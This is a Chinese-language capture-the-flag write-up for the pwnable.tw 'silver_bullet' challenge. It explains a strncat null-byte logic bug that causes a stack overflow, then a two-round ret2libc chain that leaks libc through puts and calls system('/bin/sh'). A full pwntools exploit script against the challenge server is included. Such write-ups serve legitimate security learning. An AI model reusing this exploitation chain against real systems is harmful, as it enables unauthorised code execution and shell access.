# poc

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> `strncat`逻辑漏洞 -> 栈溢出 -> 泄漏libc -> `system('/bin/sh\x00')`

在`power_up()`中`strncat`会把组合成的串最后添加一个`\x00`，而`main`里紧邻字符串`dest`的变量存的是`strlen(dest)`，因此可以覆盖该变量为`0`，从而重新计算长度后`strlen(dest) = strlen(src)`，再次`power_up()`可造成栈溢出。由于只有`beat()`返回值为`1`时`main()`正常返回，因此第二次`power_up()`考虑赋较大的值如`\xff\xff\xff`。

之后构造栈如下泄漏libc。

```
---------------
|     got     |
---------------
|    main()   |
---------------
| plt['puts'] |
---------------
|  0xdeadbeef |
---------------
|  0xffffff01 |
---------------
```

同理再来一轮，栈如下执行`system('/bin/sh\x00')`。

```
---------------
|    binsh    |
---------------
|    main()   |
---------------
|   system()  |
---------------
|  0xdeadbeef |
---------------
|  0xffffff01 |
---------------
```

# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

f = ELF('silver_bullet.dms')

if DEBUG:
    p = process('silver_bullet.dms')
    gdb.attach(p)
    e = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10103)
    e = ELF('libc_32.so.6')

def create(s):
    p.recvuntil(':')
    p.send('1')
    p.recvuntil(':')
    p.send(s)
    p.recvuntil('!')

def power(s):
    p.recvuntil(':')
    p.send('2')
    p.recvuntil(':')
    p.send(s)
    p.recvuntil('!\n')

def beat():
    p.send('3')
    p.recvuntil('!!\n')

def finish():
    p.send('4')
    p.recvuntil('!')

# r1
pad = 0xdeadbeef
ret = 0x08048954 # once again

create('a' * 47)
power('a')
power('\xff' * 3 + p32(pad) + p32(f.plt['puts']) + p32(ret) + p32(f.got['printf']))
beat()

printf_addr = u32(p.recvuntil('\n')[:4])
libc_addr = printf_addr - e.symbols['printf']
system_addr = libc_addr + e.symbols['system']

# r2

binsh_addr = libc_addr + list(e.search('/bin/sh\x00'))[0]

create('a' * 47)
power('a')
power('\xff' * 3 + p32(pad) + p32(system_addr) + p32(ret) + p32(binsh_addr))
beat()

p.interactive()
```
